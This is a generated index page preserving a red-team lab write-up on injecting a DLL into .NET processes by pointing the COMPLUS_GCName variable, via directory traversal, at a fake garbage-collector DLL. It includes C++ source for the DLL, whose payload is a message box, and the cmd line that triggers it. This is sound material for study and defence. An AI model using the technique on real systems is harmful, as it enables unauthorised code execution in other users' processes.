---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# DLL Injection via a Custom .NET Garbage Collector

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-injection-process-injection-injecting-dll-via-custom-.net-garbage-collector-environment-variable-complus-gcname` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/injecting-dll-via-custom-.net-garbage-collector-environment-variable-complus_gcname.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [DLL Injection via a Custom .NET Garbage Collector](../../topics/offensive-security/dll-injection-via-a-custom-.net-garbage-collector.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-injection-process-injection-injecting-dll-via-custom-.net-garbage-collector-environment-variable-complus-gcname |
| name | DLL Injection via a Custom .NET Garbage Collector |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-injection-process-injection/injecting-dll-via-custom-.net-garbage-collector-environment-variable-complus_gcname.md |

## Preserved Source Material

````yaml
_asset_filenames:
- image (571).png
_body: "# DLL Injection via a Custom .NET Garbage Collector\n\nThis is a quick lab to test a DLL injection technique discovered\
  \ by [@am0nsec](https://twitter.com/am0nsec), which he describes in his blogpost [https://www.contextis.com/us/blog/bring-your-own-.net-core-garbage-collector](https://www.contextis.com/us/blog/bring-your-own-.net-core-garbage-collector)\
  \ - go check it out!\n\nThe idea behind this technique is that a low privileged user can specify a custom Garbage Collector\
  \ (GC), that a  .NET application should use. A custom GC can be specified by setting a command shell environment variable\
  \ `COMPLUS_GCName`, that points to a malicious DLL which represents a custom Garbage Collector.\n\n{% hint style=\"warning\"\
  \ %}\nNormally, specifying a custom GC requires administartor privileges, however, since path to a custom GC in `COMPLUS_GCName`\
  \ is not sanitized when a custom GC is loaded, directory traversal allows **any** unprivileged user to specify a custom\
  \ GC to be loaded from an arbitrary location to which they can drop their DLL.\n{% endhint %}\n\nThe Gargage Collector DLL\
  \ needs to export `GC_VersionInfo` method for this technique to work - this is the method that will contain our payload,\
  \ that will be executed once a .NET program starts and loads our custom GC DLL.\n\n## Execution\n\nLet's create a DLL that\
  \ represents a custom Garbage Collector. It needs to export a function `GC_VersionInfo`, which in our case executes a simple\
  \ message box:\n\n```cpp\n#include <Windows.h>\n\nBOOL APIENTRY DllMain( HMODULE hModule,\n                       DWORD\
  \  ul_reason_for_call,\n                       LPVOID lpReserved\n                     )\n{\n    switch (ul_reason_for_call)\n\
  \    {\n    case DLL_PROCESS_ATTACH:\n    case DLL_THREAD_ATTACH:\n    case DLL_THREAD_DETACH:\n    case DLL_PROCESS_DETACH:\n\
  \        break;\n    }\n    return TRUE;\n}\n\nstruct VersionInfo\n{\n    UINT32 MajorVersion;\n    UINT32 MinorVersion;\n\
  \    UINT32 BuildVersion;\n    const char* Name;\n\n};\n\nextern \"C\" __declspec(dllexport) void GC_VersionInfo(VersionInfo\
  \ * info)\n{\n    info->BuildVersion = 0;\n    info->MinorVersion = 0;\n    info->BuildVersion = 0;\n    MessageBoxA(NULL,\
  \ \"Injection\", \"Injection\", 0);\n}\n```\n\nOnce the DLL is compiled, we can set the `COMPLUS_GCName` environment variable\
  \ in our cmd.exe shell and point it to the compiled DLL:\n\n```\nset COMPLUS_GCName=..\\..\\..\\..\\..\\..\\..\\..\\..\\\
  ..\\..\\..\\..\\labs\\GarbageCollector\\GC\\x64\\Release\\GC.dll & dotnet.exe -h\n```\n\nWe can execute any .NET binary\
  \ found on the system and it will load our GC.dll. In this lab, we do:\n\n```\ndotnet.exe -h\n```\n\nBelow shows that our\
  \ GC.dll got injected into the dotnet.exe:\n\n![](<../../.gitbook/assets/image (571).png>)\n\n## References\n\n{% embed\
  \ url=\"https://www.contextis.com/us/blog/bring-your-own-.net-core-garbage-collector\" %}"
_relative_path: offensive-security/code-injection-process-injection/injecting-dll-via-custom-.net-garbage-collector-environment-variable-complus_gcname.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/injecting-dll-via-custom-.net-garbage-collector-environment-variable-complus_gcname.md
````
